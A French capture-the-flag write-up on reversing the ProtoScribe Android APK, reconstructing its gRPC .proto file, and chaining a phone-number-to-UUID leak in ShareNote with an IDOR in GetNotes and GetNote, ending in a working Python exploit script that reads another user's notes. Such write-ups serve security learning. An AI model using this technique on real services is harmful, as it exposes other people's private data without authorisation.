# Writeup Template

## Approach
J’ai commencé par analyser l’APK en l’exécutant sur un émulateur afin de comprendre les fonctionnalités principales (création, modification, suppression et partage de notes). On sait toute suite qu'il y'a usage de l'api **gRpc** grâce au lien remote qu'utilise l'apk et qui est fourni par le chall.

## Reverse de l’APK
Pour comprendre la communication backend, j’ai extrait le contenu de l’APK :
```
unzip ProtoScribe.apk -d /tmp/apk_raw
```

Le fichier classes.dex contient le bytecode Dalvik. Les chaînes de caractères étant stockées en clair, j’ai utilisé :
```
strings /tmp/apk_raw/classes.dex | grep -i "protoscribe\|grpc\|note\|auth"
```  

Cela m’a permis d’identifier des éléments clés :
```
rotoscribe"1
AuthRequest
AuthResponse
GetNoteRequest
Note
GetNoteResponse
note
.protoscribe.Note".
GetNotesRequest
GetNotesResponse
notes_uuid
AddNoteRequest
EditNoteRequest
RemoveNoteRequest
ShareNoteRequest
ShareNoteResponse
.protoscribe.Contact2
NoteService
```  

## Reconstruction du .proto
Protocol Buffers embarque le descripteur complet du .proto dans le binaire compilé coté client.

J’ai donc recherché une signature typique :
```python
with open('/tmp/apk_raw/classes.dex', 'rb') as f:
    data = f.read()

idx = data.find(b'src/main/proto/scribe.proto')
chunk = data[idx:idx+2000]
printable = ''.join(chr(b) if 32 <= b < 127 else '\n' for b in chunk)
print(printable)
```  

Cela permet de reconstruire le fichier .proto contenant les méthodes gRPC.

## Vulnérabilité

IDOR (Insecure Direct Object Reference)
```
message GetNotesRequest {
  string token = 1;
  string uuid = 2;
}
```  
Le serveur fait :

```
GetNotes(uuid)
```  

Pas de vérification :

```
token.user == uuid.user
```  

Fuite d’UUID via ShareNote

```
message ShareNoteResponse {
  string success = 1;
  string error = 2;
  repeated Contact contacts = 3;
}

message Contact {
  string uuid = 1;
  string phone_number = 2;
}
```  

On peut faire :

```
ShareNote(token, my_note, ["0102030405"])
```  

Et récupérer l'uuid ia les infos leaké par la réponse dans **conatcts**



## Solution
1. [Création d’un compte]  
Utilisation de Register pour obtenir un token et un uuid.
2. [Création d’une note]  
Ajout d’une note avec AddNote, puis récupération de son uuid via GetNotes.
3. [Exploitation de ShareNote]  
Appel à ShareNote en partageant ma note avec le numéro cible 0102030405.
La réponse retourne un objet Contact contenant le uuid de la cible.
4. [Accès aux données de la cible (IDOR)]  
Utilisation de GetNotes avec le uuid user de la cible → récupération de ses notes et uuid associé.
Puis GetNote pour lire le contenu → récupération du flag.

## Key Insights
Fuite d’information via ShareNote : permet de récupérer le uuid d’un utilisateur à partir de son numéro de téléphone.

IDOR (Insecure Direct Object Reference) : les endpoints GetNotes et GetNote acceptent un uuid sans vérifier si il appartient au propriétaire du token ou pas.
En combinant les deux, on peut accéder aux notes d’un autre utilisateur.

## Tools
-  apktools, grpcio / grpcio-tools, jadx, hermes-dec, Genymotion → exécution de l’application

## Code
```python
# le .proto réconstitué :
syntax = "proto3";

package protoscribe;

service NoteService {
  rpc Login(AuthRequest) returns (AuthResponse);
  rpc Register(AuthRequest) returns (AuthResponse);
  rpc GetNote(GetNoteRequest) returns (GetNoteResponse);
  rpc GetNotes(GetNotesRequest) returns (GetNotesResponse);
  rpc AddNote(AddNoteRequest) returns (GenericResponse);
  rpc EditNote(EditNoteRequest) returns (GenericResponse);
  rpc RemoveNote(RemoveNoteRequest) returns (GenericResponse);
  rpc ShareNote(ShareNoteRequest) returns (ShareNoteResponse);
}

message GenericResponse {
  string success = 1;
  string error = 2;
}

message AuthRequest {
  string phone_number = 1;
  string password = 2;
}

message AuthResponse {
  string success = 1;
  string error = 2;
  string token = 3;
  string uuid = 4;
}

message GetNoteRequest {
  string token = 1;
  string uuid = 2;
}

message Note {
  string uuid = 1;
  string title = 2;
  string content = 3;
}

message GetNoteResponse {
  string success = 1;
  string error = 2;
  Note note = 3;
}

message GetNotesRequest {
  string token = 1;
  string uuid = 2;
}

message GetNotesResponse {
  string success = 1;
  string error = 2;
  repeated string notes_uuid = 3;
}

message AddNoteRequest {
  string token = 1;
  string title = 2;
  string content = 3;
}

message EditNoteRequest {
  string token = 1;
  string uuid = 2;
  string title = 3;
  string content = 4;
}

message RemoveNoteRequest {
  string token = 1;
  string uuid = 2;
}

message Contact {
  string uuid = 1;
  string phone_number = 2;
}

message ShareNoteRequest {
  string token = 1;
  string uuid = 2;
  repeated string phone_numbers = 3;
}

message ShareNoteResponse {
  string success = 1;
  string error = 2;
  repeated Contact contacts = 3;
}
```

```python
python -m grpc_tools.protoc   -I.   --python_out=.   --grpc_python_out=.   scribe.proto
```

```python
# Code snippet
import grpc
import scribe_pb2
import scribe_pb2_grpc

HOST = "worker01.flag4jobs.live:11689"

def register():
    channel = grpc.insecure_channel(HOST)
    stub = scribe_pb2_grpc.NoteServiceStub(channel)

    req = scribe_pb2.AuthRequest(
        phone_number="9999999999",
        password="test"
    )

    res = stub.Register(req)
    print(res)

    return res.token, res.uuid


def add_note(token):
    channel = grpc.insecure_channel(HOST)
    stub = scribe_pb2_grpc.NoteServiceStub(channel)

    req = scribe_pb2.AddNoteRequest(
        token=token,
        title="test",
        content="hello"
    )

    print(stub.AddNote(req))


def get_notes(token, uuid):
    channel = grpc.insecure_channel(HOST)
    stub = scribe_pb2_grpc.NoteServiceStub(channel)

    req = scribe_pb2.GetNotesRequest(token=token, uuid=uuid)
    res = stub.GetNotes(req)

    print(res)
    return res.notes_uuid


def share_note(token, note_uuid):
    channel = grpc.insecure_channel(HOST)
    stub = scribe_pb2_grpc.NoteServiceStub(channel)

    req = scribe_pb2.ShareNoteRequest(
        token=token,
        uuid=note_uuid,
        phone_numbers=["0102030405"]
    )

    res = stub.ShareNote(req)
    print(res)

    return res.contacts


def get_note(token, note_uuid):
    channel = grpc.insecure_channel(HOST)
    stub = scribe_pb2_grpc.NoteServiceStub(channel)

    req = scribe_pb2.GetNoteRequest(token=token, uuid=note_uuid)
    res = stub.GetNote(req)

    print(res)


def main():
    token, my_uuid = register()

    add_note(token)

    my_notes = get_notes(token, my_uuid)
    my_note_uuid = my_notes[0]

    contacts = share_note(token, my_note_uuid)

    target_uuid = contacts[0].uuid
    print("TARGET UUID:", target_uuid)

    target_notes = get_notes(token, target_uuid)

    for n in target_notes:
        get_note(token, n)


if __name__ == "__main__":
    main()
```
